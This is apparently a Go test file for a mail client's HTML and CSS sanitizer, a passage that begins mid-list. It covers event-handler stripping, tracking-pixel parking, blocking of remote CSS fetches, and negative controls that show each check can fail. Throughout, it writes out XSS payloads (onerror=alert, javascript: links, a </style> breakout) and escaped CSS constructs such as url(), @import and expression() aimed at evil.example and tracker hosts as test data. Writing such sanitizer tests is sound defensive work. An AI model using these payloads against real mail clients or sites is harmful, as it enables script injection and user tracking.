		`<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`,
		`<form action="https://evil.example/"><input name=p></form>`,
		`<meta http-equiv="refresh" content="0;url=https://evil.example/">`,
		`<link rel="dns-prefetch" href="//t.example">`,
		`<style>@import url(https://t.example/x.css)</style>`,
		`<div style="background:url(https://t.example/x.png)">x</div>`,
		// #297 — the escaped forms, so the fixed-point and totality properties
		// cover them too.
		`<style>p{background:\75 rl(https://t.example/x.png)}</style>`,
		`<style>@\69 mport url(https://t.example/x.css);p{color:red}</style>`,
		`<div style="background:u\72 l(https://t.example/x.png)">x</div>`,
		`<div style="background-image:image-set('https://t.example/x.png' 1x)">x</div>`,
		`<div style="width:e\78 pression(alert(1))">x</div>`,
		`<style>@media screen{a:hover{color:red;background:#fff}}</style>`,
		`<div style="font:12px/1.5 &quot;Helvetica Neue&quot;,sans-serif;color:#333">x</div>`,
		`<style><!--` + "\n" + `p{color:red}` + "\n" + `--></style>`,
		`<div style="background:\">x</div>`,
		`<style>p{color:re/**/d;background:u/**/rl(https://t.example/x.png)}</style>`,
		`<a href="javascript:alert(1)">x</a>`,
		`<noscript><img src=x onerror=alert(1)></noscript>`,
		`<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>`,
		`<object data="https://evil.example/x.swf"></object>`,
		`<body background="https://t.example/x.png">`,
		`<video poster="https://t.example/x.png"><source src="https://t.example/v.mp4"></video>`,
		`<table background="https://t.example/x.png"><tr><td>x</td></tr></table>`,
		`<!--<img src=x onerror=alert(1)>-->`,
		`<div title='&quot;&gt;&lt;img src=x onerror=alert(1)&gt;'>t</div>`,
		`<p>ordinary <b>mail</b> with a <a href="https://example.com">link</a></p>`,
	}
}

// The remote-content contract the WEB CLIENT depends on: the marker it looks for
// (data-mailroom-blocked), and the attribute it restores from
// (data-mailroom-remote-src). web/src/app/ui/messageDocument.ts hard-codes both
// strings; if either name changes here and not there, the "Show remote content"
// button silently stops working — so the names are asserted, not assumed.
func TestRemoteContentContract(t *testing.T) {
	if remoteSrcAttr != "data-mailroom-remote-src" ||
		remoteSrcsetAttr != "data-mailroom-remote-srcset" ||
		blockedAttr != "data-mailroom-blocked" ||
		pixelSrcAttr != "data-mailroom-pixel-src" ||
		pixelSrcsetAttr != "data-mailroom-pixel-srcset" {
		t.Fatalf("the remote-content attribute names changed: web/src/app/ui/messageDocument.ts " +
			"hard-codes them and must be changed in the same commit")
	}

	// ⚠ THE PIXEL NAMES MUST NOT BEGIN WITH THE RESTORABLE ONES. The client
	// restores by replacing the literal `data-mailroom-remote-src="`; if a pixel
	// name were, say, `data-mailroom-remote-src-pixel`, that replacement would
	// match its prefix and un-park the beacon. The suppression rests on these two
	// families of names being unrelated as strings, which is easy to break by
	// choosing a "tidier" name later.
	for _, p := range []string{pixelSrcAttr, pixelSrcsetAttr} {
		if strings.HasPrefix(p, remoteSrcAttr) || strings.HasPrefix(p, remoteSrcsetAttr) {
			t.Errorf("the pixel attribute %q starts with a restorable name — the client's "+
				"literal replacement would un-park beacons", p)
		}
	}

	// A beacon must be parked, marked blocked, and NOT restorable.
	pix := SanitizeHTML(`<img src="https://tracker.example/open.gif" width="1" height="1">`)
	if !strings.Contains(pix, pixelSrcAttr) {
		t.Errorf("a 1x1 was not parked as a pixel: %s", pix)
	}
	if strings.Contains(pix, remoteSrcAttr) {
		t.Errorf("a 1x1 kept a RESTORABLE name — the client would load it: %s", pix)
	}

	got := SanitizeHTML(`<img src="https://tracker.example/p.gif">`)
	if !strings.Contains(got, blockedAttr) {
		t.Errorf("a blocked remote image is not marked with %s: %s", blockedAttr, got)
	}

	// And the restore the client performs (a literal replacement of
	// `data-mailroom-remote-src="` with `src="`) must be SOUND on this output:
	// that byte sequence may occur only where the server wrote an attribute name.
	// It is sound because html.EscapeString turns every '"' in text and in an
	// attribute VALUE into &#34;.
	hostile := SanitizeHTML(`<p>data-mailroom-remote-src="https://evil.example/x.gif"</p>`)
	if strings.Contains(hostile, `data-mailroom-remote-src="`) {
		t.Errorf("a message that merely MENTIONS the marker produced a live one — the "+
			"client's restore would resurrect it: %s", hostile)
	}
}

// ── THE on* STRIP, ASSERTED INDEPENDENTLY (Forgejo #308) ─────────────────────
//
// sanitizeAttrs drops an event handler twice. First explicitly:
//
//	if strings.HasPrefix(key, "on") { continue }   // "the one rule that must
//	                                               //  never grow an exception"
//
// and then again by omission, because `onclick` is not in allowedAttrs and the
// `!allowedAttrs[key]` backstop drops everything unnamed.
//
// Two locks on one door is the right design. What #308 MEASURED is what it cost:
// replacing the explicit rule with `if false` left `go test ./...` GREEN. Every
// existing assertion about `on*` — including assertSafeDOM's, which is otherwise
// the strongest thing in this file — was satisfied by the backstop alone, so the
// rule with the emphatic comment on it was not falsifiable by anything. And
// `allowedAttrs` was referenced by ZERO test files, so nothing forbade the one
// edit that turns the redundancy into a single point of failure pointing the
// wrong way: adding an `on*` key to the allowlist.
//
// The two tests below are those two claims, stated separately, each able to fail
// on its own.

// The explicit rule, with the backstop taken away from it.
//
// The first half is the ordinary behaviour and proves nothing on its own — it
// passes with either lock alive. The second half is the NEGATIVE CONTROL: it
// puts an `on*` key on allowedAttrs for the duration of the test, so the backstop
// is now voting to KEEP the handler, and asserts it is dropped anyway. Only the
// prefix rule can be doing that. Delete the rule and this goes red; that is the
// whole point of writing it this way.
func TestEventHandlersAreStrippedByTheirOwnRule(t *testing.T) {
	// 1. The behaviour. A handler goes, its harmless neighbour stays — the
	//    second half matters, because "sanitizeAttrs returned nothing" would
	//    satisfy the first half forever.
	got := sanitizeAttrs("div", []html.Attribute{
		{Key: "onclick", Val: "alert(1)"},
		{Key: "OnError", Val: "alert(2)"}, // case is normalised before the check
		{Key: "onmouseover", Val: "alert(3)"},
		{Key: "title", Val: "a tooltip"},
	}, false, nil, nil)
	if attrValue(got, "title") != "a tooltip" {
		t.Errorf("sanitizeAttrs dropped `title` too — an allowlist that drops everything "+
			"is not a passing test, it is a broken renderer: %v", got)
	}
	for _, a := range got {
		if strings.HasPrefix(strings.ToLower(a.Key), "on") {
			t.Errorf("sanitizeAttrs kept the event handler %q=%q: %v", a.Key, a.Val, got)
		}
	}

	// 2. The negative control. With `onclick` ALLOWLISTED, the backstop can no
	//    longer be what removes it.
	restore := allowedAttrs["onclick"]
	allowedAttrs["onclick"] = true
	t.Cleanup(func() {
		if restore {
			allowedAttrs["onclick"] = true
		} else {
			delete(allowedAttrs, "onclick")
		}
	})

	got = sanitizeAttrs("div", []html.Attribute{
		{Key: "onclick", Val: "alert(1)"},
		{Key: "title", Val: "a tooltip"},
	}, false, nil, nil)
	if attrValue(got, "onclick") != "" {
		t.Errorf("with `onclick` on the attribute ALLOWLIST, sanitizeAttrs kept it: %v\n"+
			"That means the explicit `strings.HasPrefix(key, \"on\")` rule in sanitizeAttrs is "+
			"gone or unreachable, and the ONLY thing removing event handlers is the "+
			"allowlist backstop — one edit to allowedAttrs away from live script in a "+
			"message body (Forgejo #308).", got)
	}
	if attrValue(got, "title") != "a tooltip" {
		t.Errorf("the control mutated more than it meant to: %v", got)
	}

	// ...and the same thing through the door that actually ships, so the claim is
	// about SanitizeHTML and not only about an unexported helper.
	if out := SanitizeHTML(`<div onclick="alert(1)">x</div>`); strings.Contains(out, "onclick") {
		t.Errorf("SanitizeHTML kept an allowlisted `onclick`: %s", out)
	}
}

// Nothing on the attribute allowlist may start with "on".
//
// This is the mutation the rule above defends against, forbidden at its source.
// The two are not redundant: this one keeps the allowlist honest, the one above
// keeps the allowlist from being the only thing that matters. A future
// `onload`-shaped name added here "because it is only a presentational hint" is
// exactly the exception the sanitizer's comment says must never exist.
//
// The prefix test is deliberately blunt — no exception list, no "well, `once`
// isn't an event handler". There is no attribute a mail body needs whose name
// begins with those two letters, so a blunt rule costs nothing and cannot be
// argued around one attribute at a time.
func TestNoEventHandlerIsOnTheAttributeAllowlist(t *testing.T) {
	for key := range allowedAttrs {
		if strings.HasPrefix(strings.ToLower(key), "on") {
			t.Errorf("allowedAttrs contains %q. Every attribute whose name starts with `on` is "+
				"an event handler in some element in some browser, and an allowlisted one would "+
				"survive everything else this file asserts (Forgejo #308).", key)
		}
	}
	// The allowlist is not empty — otherwise this test would pass on a map that
	// had been deleted, which is the same vacuity #308 was about.
	if len(allowedAttrs) < 10 {
		t.Errorf("allowedAttrs has only %d entries; this test would pass vacuously on an "+
			"empty map, so its size is asserted too", len(allowedAttrs))
	}
}

// attrValue returns the value of key in attrs, or "" if it is absent.
func attrValue(attrs []html.Attribute, key string) string {
	for _, a := range attrs {
		if a.Key == key {
			return a.Val
		}
	}
	return ""
}

// ── THE CSS FILTER, ASSERTED DIRECTLY (Forgejo #297) ─────────────────────────
//
// TestSanitizeHTML asserts through the HTML sanitizer, which is the shape a
// caller sees. This asserts the two CSS entry points on their own, with EXACT
// expected output, because "the tracker URL is gone" and "the sanitizer produced
// what it should have" are different claims and only the second one catches a
// filter that has quietly started dropping everything.
func TestSanitizeCSS(t *testing.T) {
	t.Run("style attribute (a declaration list)", func(t *testing.T) {
		for _, tc := range []struct{ name, in, want string }{
			// The #297 payloads. Each spells a fetching construct the old regex
			// could not see; each must lose its DECLARATION and keep its neighbour.
			{"escaped url()", `background:\75 rl(https://tracker.example/a.png);color:red`, "color:red"},
			{"escaped url() mid-name", `background:u\72 l(https://tracker.example/b.png);color:red`, "color:red"},
			{"uppercase-hex escape", `background:\55 RL(https://tracker.example/c.png);color:red`, "color:red"},
			{"escape with no space", `background:\000075rl(https://tracker.example/d.png);color:red`, "color:red"},
			{"image-set", `background-image:image-set('https://tracker.example/e.png' 1x);color:red`, "color:red"},
			{"-webkit-image-set", `background:-webkit-image-set(url(https://tracker.example/f.png) 1x);color:red`, "color:red"},
			{"cross-fade", `background:cross-fade(url(https://tracker.example/g.png),50%);color:red`, "color:red"},
			{"element()", `background:element(#hidden);color:red`, "color:red"},
			{"image()", `background:image(https://tracker.example/h.png);color:red`, "color:red"},
			{"src()", `background:src('https://tracker.example/i.png');color:red`, "color:red"},
			{"var() indirection", `--x:url(https://tracker.example/j.png);background-image:var(--x);color:red`, "color:red"},

			// The vectors the OLD regex did stop. They must still be stopped.
			{"plain url()", `background:url(https://tracker.example/k.png);color:red`, "color:red"},
			{"quoted url()", `background:url("https://tracker.example/l.png");color:red`, "color:red"},
			{"url with space before paren", `background:url ('https://tracker.example/m.png');color:red`, "color:red"},
			{"expression()", `width:expression(alert(1));color:red`, "color:red"},
			{"escaped expression()", `width:e\78 pression(alert(1));color:red`, "color:red"},
			// The bare-argument form exists so the FUNCTION allowlist is observed on
			// its own: `expression(alert(1))` is refused twice over (neither
			// `expression` nor `alert` is a listed function), so it cannot tell
			// whether the entry for `expression` is doing anything.
			{"expression() with a bare argument", `width:expression(x);color:red`, "color:red"},
			{"-moz-binding", `-moz-binding:url(http://evil.example/x.xml);color:red`, "color:red"},
			{"behavior", `behavior:url(#default#time2);color:red`, "color:red"},
			{"javascript: scheme", `background:javascript:alert(1);color:red`, "color:red"},
			{"vbscript: scheme", `background:vbscript:msgbox(1);color:red`, "color:red"},
			{"IE progid filter", `filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://tracker.example/n.png');color:red`, "color:red"},
			{"a markup character", `color:red;font-family:a<b`, "color:red"},
			{"a comment inside a name", `background:u/**/rl(https://tracker.example/o.png);color:red`, "color:red"},

			// Inert values whose PROPERTY is off the allowlist. These are the only
			// cases that observe the property gate on its own — everything else
			// above is caught by the value gate too.
			{"an off-list property with an inert value", `position:absolute;top:0;z-index:9;color:red`, "color:red"},
			{"a vendor hack", `*color:blue;_color:green;color:red`, "color:red"},
			{"a custom property with an inert value", `--brand:#0057b8;color:red`, "color:red"},

			// Legitimate mail CSS. If these ever collapse to "", every case above
			// starts passing for the wrong reason.
			{"a newsletter cell", `font-family:Arial;font-size:14px;color:#333`, `font-family:Arial;font-size:14px;color:#333`},
			{"a background colour", `color:blue;background:#f4f4f4`, `color:blue;background:#f4f4f4`},
			{"the font shorthand", `font:italic bold 12px/1.5 "Helvetica Neue",sans-serif`, `font:italic bold 12px/1.5 "Helvetica Neue",sans-serif`},
			{"calc and rgba", `width:calc(100% - 20px);color:rgba(0,0,0,.5)`, `width:calc(100% - 20px);color:rgba(0,0,0,.5)`},
			{"important", `color:red !important`, `color:red !important`},
			{"a border", `border:1px solid #ccc;padding:0 8px;text-align:center`, `border:1px solid #ccc;padding:0 8px;text-align:center`},
			{"whitespace and case are normalized", `  COLOR :  Red  `, `color:Red`},
		} {
			if got := sanitizeStyleAttr(tc.in); got != tc.want {
				t.Errorf("%s:\n  in:   %s\n  got:  %q\n  want: %q", tc.name, tc.in, got, tc.want)
			}
		}
	})

	t.Run("style element (a stylesheet)", func(t *testing.T) {
		for _, tc := range []struct{ name, in, want string }{
			{"@import", `@import url("https://tracker.example/t.css");p{color:red}`, `p{color:red}`},
			{"escaped @import", `@\69 mport url(https://tracker.example/t.css);p{color:red}`, `p{color:red}`},
			{"@import through a comment", `@im/**/port url(https://tracker.example/t.css);p{color:red}`, `p{color:red}`},
			{"@font-face", `@font-face{font-family:t;src:url(https://tracker.example/f.woff)}p{color:red}`, `p{color:red}`},
			{"@charset and @namespace", `@charset "utf-8";@namespace url(http://evil.example/ns);p{color:red}`, `p{color:red}`},
			{"@keyframes is not a grouping rule we keep", `@keyframes k{from{color:red}}p{color:blue}`, `p{color:blue}`},
			{"escaped url in a rule", `p{background:\75 rl(https://tracker.example/bg.png);color:red}`, `p{color:red}`},
			{"a rule that keeps nothing is dropped whole", `p{background-image:url(https://tracker.example/x.png)}a{color:red}`, `a{color:red}`},

			// Structure that must survive.
			{"a media query", `@media only screen and (max-width:600px){.c{width:100%;color:#333}}`,
				`@media only screen and (max-width:600px){.c{width:100%;color:#333}}`},
			{"pseudo-classes and grouped selectors", `a:hover{color:red}.x,.y{margin:0}#id{padding:1px}`,
				`a:hover{color:red}.x,.y{margin:0}#id{padding:1px}`},
			{"an attribute selector", `td[align="center"]{color:red}`, `td[align="center"]{color:red}`},
			{"the <!-- --> wrapper old mail uses", "<!--\np{color:red}\n-->", `p{color:red}`},

			// Structure that is dropped, on purpose.
			{"a child combinator now SURVIVES (#324)", `td > p{color:red}p{color:blue}`, `td > p{color:red}p{color:blue}`},
			{"a Sass parent selector still costs its rule, not the stylesheet", `&:hover{color:red}p{color:blue}`, `p{color:blue}`},
			{"a bare declaration is not a rule", `color:red`, ``},
			{"an empty rule is not emitted", `p{}`, ``},
		} {
			if got := sanitizeStylesheet(tc.in); got != tc.want {
				t.Errorf("%s:\n  in:   %s\n  got:  %q\n  want: %q", tc.name, tc.in, got, tc.want)
			}
		}
	})
}

// The CSS filter's own three properties, over an adversarial corpus: it never
// panics, its output is INERT by all three checks, and its output is a FIXED
// POINT.
//
// The fixed point matters for the same reason it does on the HTML side: if
// sanitizing our own output changed it, then the first pass emitted something our
// own tokenizer reads differently than it wrote — and a tokenizer that disagrees
// with itself certainly disagrees with a browser. Half of this corpus is
// truncated, unbalanced or malformed on purpose, because that is where a
// hand-written tokenizer goes wrong.
func TestSanitizeCSSIsTotalInertAndAFixedPoint(t *testing.T) {
	corpus := []string{
		"", " ", ";", ";;;", ":", "{", "}", "{}", "()", "((((", "))))", "[[[", "\\",
		"\\\\", "\\g", "\\75", "\\75 ", "\\0", "\\110000 ", "\\d800 ", `"`, `'`,
		"/*", "/**/", "/*/", "*/", "<!--", "-->", "<!---->",
		"color:red", "color:", ":red", "color::red", "color:red;;color:blue",
		`background:url(`, `background:url("`, `background:url('x`, `background:url(x`,
		`background:\75 rl(https://tracker.example/a.png)`,
		`background:u\72 l(https://tracker.example/b.png)`,
		`background-image:image-set('https://tracker.example/c.png' 1x)`,
		`width:expression(alert(1))`, `width:e\78 pression(alert(1))`,
		`font-family:"unterminated`, "font-family:\"a\nb\"", `font-family:'a\'b'`,
		`font-family:日本語フォント`, `font-family:\4e2d \6587 `,
		// An IDENTIFIER whose decoded text carries a structural character. These
		// pass the value-token check (an ident is an ident), so the only thing
		// standing between them and a `</style>` breakout is cssWriteIdent
		// re-escaping what it emits — which is exactly the kind of guarantee that
		// has to be exercised to exist.
		`font-family:a\3c b`, `font-family:a\3c \2f style\3e `,
		`font-family:a\3b b`, `font-family:a\7b b`, `font-family:a\28 b`,
		`font-family:a\22 b`, `font-family:a\5c b`, `font-family:a\'b`,
		`color:\72 ed`, `\63 olor:red`, `\62 ackground-image:url(https://tracker.example/x.png)`,
		`color:red !important`, `color:red!important!important`,
		`width:calc(100% - (2px * 3))`, `width:calc(`, `width:calc(()`,
		`p{color:red}`, `p{color:red`, `p{`, `}p{color:red}`,
		`@media screen{p{color:red}}`, `@media screen{p{color:red}`, `@media{p{color:red}}`,
		`@media screen`, `@import`, `@import;`, `@\69 mport url(x);p{color:red}`,
		`@media screen{@media print{@media all{@media speech{@media x{p{color:red}}}}}}`,
		`a:hover{color:red}`, `td[align="center"]{color:red}`, `p:not(.x){color:red}`,
		`* html p{color:red}`, `td > p{color:red}`,
		`p{content:"</style><img src=x onerror=alert(1)>"}`,
		`p{font-family:"</style>"}`, `p{color:red}</style><script>alert(1)</script>`,
		strings.Repeat("p{color:red}", 500),
		strings.Repeat("{", 500), strings.Repeat("\\", 500),
		"\x00color:red", "col\x01or:red",
	}
	for _, in := range corpus {
		for _, f := range []struct {
			name string
			fn   func(string) string
			mode cssCheckMode
		}{
			{"sanitizeStyleAttr", sanitizeStyleAttr, cssCheckDeclarations},
			{"sanitizeStylesheet", sanitizeStylesheet, cssCheckStylesheet},
		} {
			var once, twice string
			func() {
				defer func() {
					if r := recover(); r != nil {
						t.Fatalf("%s panicked on %.60q: %v", f.name, in, r)
					}
				}()
				once = f.fn(in)
				twice = f.fn(once)
			}()
			if once != twice {
				t.Errorf("%s is not a fixed point:\n  in:    %q\n  once:  %q\n  twice: %q",
					f.name, in, once, twice)
			}
			// ⚠ NARROWED PER MODE BY #324, NOT WEAKENED WHOLESALE.
			//
			// This asserted no '<' AND no '>' in either output. '>' is now a legal
			// SELECTOR delimiter (the child combinator), so a stylesheet may
			// legitimately contain one — but a declaration list may not, because
			// cssValueDelims still excludes '>' and a style="" attribute has no
			// selectors at all. Relaxing both would have dropped real coverage on
			// the attribute path for the sake of a change that does not touch it.
			//
			// '<' stays forbidden in BOTH: it is what '</style' needs, and it is
			// unconstructible by every path (see cssPreludeDelims).
			forbidden := "<>"
			if f.mode == cssCheckStylesheet {
				forbidden = "<"
			}
			if strings.ContainsAny(once, forbidden) {
				t.Errorf("%s emitted a markup character (forbidden here: %q):\n  in:  %q\n  out: %q",
					f.name, forbidden, in, once)
			}
			assertInertCSS(t, func(format string, args ...any) {
				t.Errorf(format+"\n  in: %q", append(args, in)...)
			}, once, f.mode)
		}
	}
}

// ── THE NEGATIVE CONTROL (#131's lesson, applied to #297's fix) ──────────────
//
// The CSS assertions above are the reason this issue is closed, so each of the
// three must be shown to be able to FAIL. Three assertions about a sandbox once
// passed against a page that could not have loaded (#131); the old assertInertCSS
// passed against CSS that fetched. A green security test that cannot go red is
// read as evidence and is not evidence.
//
// Each case below names the ONE check it is controlling, and asserts that that
// check alone objects to it.
func TestTheCSSInertnessCheckerCanActuallyFail(t *testing.T) {
	fired := func(check func(func(string, ...any))) bool {
		hit := false
		check(func(string, ...any) { hit = true })
		return hit
	}

	t.Run("cssCheckDeclaredProperties sees a property off the allowlist", func(t *testing.T) {
		for _, bad := range []string{
			`background-image:url(https://tracker.example/x.png)`,
			`cursor:url(https://tracker.example/x.cur)`,
			`-moz-binding:url(http://evil.example/x.xml)`,
			`--x:url(https://tracker.example/x.png)`,
		} {
			if !fired(func(f func(string, ...any)) {
				cssCheckDeclaredProperties(f, bad, cssCheckDeclarations)
			}) {
				t.Errorf("the property check did not object to %q — it cannot observe "+
					"the failure it claims to exclude", bad)
			}
		}
		// …and inside a stylesheet, where the declaration is one block deep.
		bad := `@media screen{p{background-image:url(https://tracker.example/x.png)}}`
		if !fired(func(f func(string, ...any)) {
			cssCheckDeclaredProperties(f, bad, cssCheckStylesheet)
		}) {
			t.Errorf("the property check did not object to %q inside @media", bad)
		}
		// The control's control: it must NOT object to a legitimate selector that
		// looks like a declaration.
		for _, ok := range []string{
			`a:hover{color:red}`,
			`@media only screen and (max-width:600px){a:hover{color:red}}`,
			`td[align="center"]{color:red}`,
		} {
			if fired(func(f func(string, ...any)) {
				cssCheckDeclaredProperties(f, ok, cssCheckStylesheet)
			}) {
				t.Errorf("the property check objected to %q, which is a SELECTOR — a check "+
					"that fires on everything proves nothing either", ok)
			}
		}
	})

	t.Run("cssCheckNoFetchingTokens sees a url-token, a function, an at-rule", func(t *testing.T) {
		for _, bad := range []string{
			`background:url(https://tracker.example/x.png)`,    // <url-token>
			`background:\75 rl(https://tracker.example/x.png)`, // …spelled with an escape
			`background:url("https://tracker.example/x.png")`,  // the quoted function form
			`background-image:image-set('https://tracker.example/x.png' 1x)`,
			`width:expression(alert(1))`,
			`width:e\78 pression(alert(1))`,
			`@import url(https://tracker.example/t.css);`,
			`@font-face{src:url(https://tracker.example/f.woff)}`,
		} {
			if !fired(func(f func(string, ...any)) { cssCheckNoFetchingTokens(f, bad) }) {
				t.Errorf("the token check did not object to %q", bad)
			}
		}
		for _, ok := range []string{
			`color:rgba(0,0,0,.5);width:calc(100% - 2px)`,
			`@media only screen and (max-width:600px){p:not(.x){color:red}}`,
		} {
			if fired(func(f func(string, ...any)) { cssCheckNoFetchingTokens(f, ok) }) {
				t.Errorf("the token check objected to %q, which is inert", ok)
			}
		}
	})

	t.Run("cssCheckNoDangerousLiteral sees through every escape", func(t *testing.T) {
		for _, bad := range []string{
			`background:url(https://tracker.example/x.png)`,
			`background:\75 rl(https://tracker.example/x.png)`,
			`background:u\72 l(https://tracker.example/x.png)`,
			`background:\000075rl(https://tracker.example/x.png)`,
			`background:\55 RL(https://tracker.example/x.png)`,
			`@\69 mport url(https://tracker.example/t.css)`,
			`width:e\78 pression(alert(1))`,
			`background-image:image-set('https://tracker.example/x.png' 1x)`,
			`background:url ("https://tracker.example/x.png")`,
			`color:javascript:alert(1)`,
			`p{content:"</style><img src=x onerror=alert(1)>"}`,
		} {
			// Under BOTH modes: none of these is a mode-dependent case, and
			// asserting it in the more permissive one is the stronger claim.
			for _, mode := range []cssCheckMode{cssCheckDeclarations, cssCheckStylesheet} {
				if !fired(func(f func(string, ...any)) { cssCheckNoDangerousLiteral(f, bad, mode) }) {
					t.Errorf("the literal check did not object to %q (mode %d) — it is the "+
						"INDEPENDENT model and it is the one that would have caught #297 alone",
						bad, mode)
				}
			}
		}
		for _, ok := range []struct {
			css  string
			mode cssCheckMode
		}{
			{`font-family:Arial;color:#333`, cssCheckDeclarations},
			{`@media only screen and (max-width:600px){.c{width:100%}}`, cssCheckStylesheet},
			// #324: the child combinator is legitimate in a stylesheet.
			{`td > p{color:red}`, cssCheckStylesheet},
		} {
			if fired(func(f func(string, ...any)) { cssCheckNoDangerousLiteral(f, ok.css, ok.mode) }) {
				t.Errorf("the literal check objected to %q, which is inert", ok.css)
			}
		}

		// ⚠ THE NEGATIVE CONTROL FOR THE PER-MODE SPLIT ITSELF (#324). Without
		// this, moving '>' out of the shared list would look identical to deleting
		// it: the declaration path would silently stop checking for it and every
		// assertion above would still pass.
		if !fired(func(f func(string, ...any)) {
			cssCheckNoDangerousLiteral(f, `td > p{color:red}`, cssCheckDeclarations)
		}) {
			t.Error("'>' is no longer refused on the DECLARATION path — the per-mode split " +
				"was supposed to narrow where '>' is allowed, not remove the check")
		}
	})

	// cssFullyUnescape is the independent decoder the check above rests on. If it
	// silently decoded nothing, every case in that subtest would still pass on the
	// unescaped payloads and fail nothing — so it is asserted on its own.
	t.Run("cssFullyUnescape actually decodes", func(t *testing.T) {
		for _, tc := range []struct{ in, want string }{
			{`\75 rl(`, "url("},
			{`u\72 l(`, "url("},
			{`\000075rl(`, "url("},
			{`\55 RL(`, "URL("},
			{`@\69 mport`, "@import"},
			{`e\78 pression(`, "expression("},
			{`\;`, ";"},
			{`plain`, "plain"},
		} {
			if got := cssFullyUnescape(tc.in); got != tc.want {
				t.Errorf("cssFullyUnescape(%q) = %q, want %q", tc.in, got, tc.want)
			}
		}
	})
}

// The other half of "the hostile cases are not vacuous": real mail CSS must
// SURVIVE. Every #297 case asserts an absence, and an absence is free if the
// filter deletes everything — so this is the positive control for the entire CSS
// suite, and it is what would go red if the allowlist were tightened into
// uselessness.
func TestSanitizerKeepsLegitimateCSS(t *testing.T) {
	in := `<style>` +
		`@media only screen and (max-width:600px){.col{width:100%!important;padding:0 12px}}` +
		`.btn{background:#0057b8;color:#fff;border-radius:4px;text-decoration:none}` +
		`a:hover{text-decoration:underline}` +
		`</style>` +
		`<table width="600" bgcolor="#ffffff"><tr>` +
		`<td align="center" style="font-family:Arial,Helvetica,sans-serif;font-size:14px;` +
		`line-height:1.5;color:#333;background:#f4f4f4;padding:12px 0;border-top:1px solid #ddd">` +
		`<h1 style="margin:0 0 8px;font-weight:bold">Hello</h1></td></tr></table>`
	got := SanitizeHTML(in)
	for _, want := range []string{
		"@media only screen and (max-width:600px)",
		"width:100%!important", "padding:0 12px",
		".btn{background:#0057b8;color:#fff;border-radius:4px;text-decoration:none}",
		"a:hover{text-decoration:underline}",
		"font-family:Arial,Helvetica,sans-serif", "font-size:14px", "line-height:1.5",
		"color:#333", "background:#f4f4f4", "padding:12px 0", "border-top:1px solid #ddd",
		"margin:0 0 8px", "font-weight:bold",
		"Hello",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("the CSS allowlist destroyed legitimate mail styling %q\n  out: %s", want, got)
		}
	}
}

// A body with no remote content must NOT be marked, or the banner cries wolf on
// every message and the user learns to click through it.
func TestNoFalseRemoteContentBanner(t *testing.T) {
	for _, in := range []string{
		`<p>plain</p>`,
		`<img src="cid:x@example.com">`,
		`<img src="data:image/png;base64,iVBORw0KGgo=">`,
		`<a href="https://example.com">a link is not remote content</a>`,
	} {
		if got := SanitizeHTML(in); strings.Contains(got, blockedAttr) {
			t.Errorf("SanitizeHTML(%q) falsely reports blocked remote content: %s", in, got)
		}
	}
}
